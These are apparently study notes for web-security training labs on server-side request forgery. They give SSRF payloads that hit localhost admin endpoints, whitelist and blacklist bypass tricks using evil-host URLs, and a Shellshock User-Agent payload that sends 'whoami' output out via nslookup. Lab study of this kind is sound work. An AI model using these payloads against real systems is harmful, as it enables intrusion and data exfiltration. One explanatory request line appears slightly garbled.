# Server-side request forgery (SSRF)

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.
A successful SSRF attack can often result in unauthorized actions or access to data within the organization. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

## Finding hidden attack surface for SSRF vulnerabilities
- Partial URLs in requests
- URLs within data formats
- SSRF via the Referer header

## Blind SSRF
Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

### LAB: Basic SSRF against the local server

    Change the POST /product/stock request's body to:
    stockApi=http://localhost/admin/delete?username=carlos

### LAB: SSRF with blacklist-based input filter
- Use an alternative IP representation of 127.0.0.1, such as 2130706433 (decimal value: (127 × 256³) + (0 × 256²) + (0 × 256¹) + (1 × 256⁰) = 2130706433), 017700000001 (octal representation), or 127.1.
- Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.
    
    `stockApi=http://LoCalHost/admIn/delete?username=carlos`

### LAB: SSRF with whitelist-based input filter
- You can embed credentials in a URL before the hostname, using the @ character. For example:
`https://expected-host:fakepassword@evil-host`
- You can use the # character to indicate a URL fragment. For example:
`https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
`https://expected-host.evil-host`
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
- You can use combinations of these techniques together: 

    `stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`
-> How this URL bypasses the white-list: (`%2523` is the double-encoding of `#`)
    - First the server decodes the URL to `http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos` and considers `stock.weliketoshop.net` as the valid host and everything after it (`/admin/delete?username=carlos`) as the actual request path.
    - Since the fragment (`#`) is before `@`, it only affects username parsing, not the request path.
    - The real HTTP request made is: 
    `GET /admin/delete?username=carlos HTTP/1.1\r\nWHost: localhost`

### LAB: SSRF with filter bypass via open redirection vulnerability
Click "next product" and observe that the path parameter is placed into the `Location` header of a redirection response, resulting in an open redirection.
Change the `POST /product/stock` body to:

    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

### LAB: Blind SSRF with out-of-band detection
The server will track client's info by analyzing the URL specified at the Refe`rer header. It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied domain, but no subsequent HTTP request.

### LAB: Blind SSRF with Shellshock exploitation
In CGI (Common Gateway Interface) scripts, when a web server (e.g., Apache) executes a script, it passes HTTP request headers as environment variables. This means that headers like `User-Agent`, `Host`, `Cookie`, and `Referer` are converted into environment variables before running the script. When `Bash` starts a new shell session, it processes exported environment variables before executing the script. This is where Shellshock happens.
Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload: 

    () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

This (CVE-2014-6271) performs nslookup to your domain. Change the `Referer` header to `http://192.168.0.1:8080` and start a Sniper attack for every IP in the subnet.